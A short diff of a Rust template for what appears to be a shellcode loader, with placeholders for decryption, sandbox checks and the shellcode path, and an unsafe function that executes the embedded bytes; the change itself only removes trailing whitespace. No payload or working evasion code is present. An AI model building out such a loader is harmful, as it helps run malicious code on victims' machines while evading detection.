@@ -25,7 +25,7 @@ use std::include_bytes;
 {{IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
-    
+
 
 fn enhance(mut buf: Vec<u8>) {
     unsafe {
@@ -107,14 +107,14 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     {{SANDBOX}}
-    
+
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
 
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
     }
-    
+
     {{MAIN}}
 
     enhance(vec.clone());
